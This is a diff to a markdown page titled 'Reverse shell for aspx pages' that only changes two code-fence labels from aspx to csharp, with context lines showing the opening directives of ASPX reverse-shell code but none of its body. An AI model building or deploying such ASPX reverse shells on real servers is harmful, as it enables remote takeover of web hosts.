@@ -21,7 +21,7 @@ Reverse shell for aspx pages:
 
 ## Full Version with options
 
-```aspx
+```csharp
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System.Runtime.InteropServices" %>
 <%@ Import Namespace="System.Net" %>
@@ -1151,7 +1151,7 @@ Reverse shell for aspx pages:
 
 ## Version with dedicated ip and port
 
-```aspx
+```csharp
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System.Runtime.InteropServices" %>
 <%@ Import Namespace="System.Net" %>
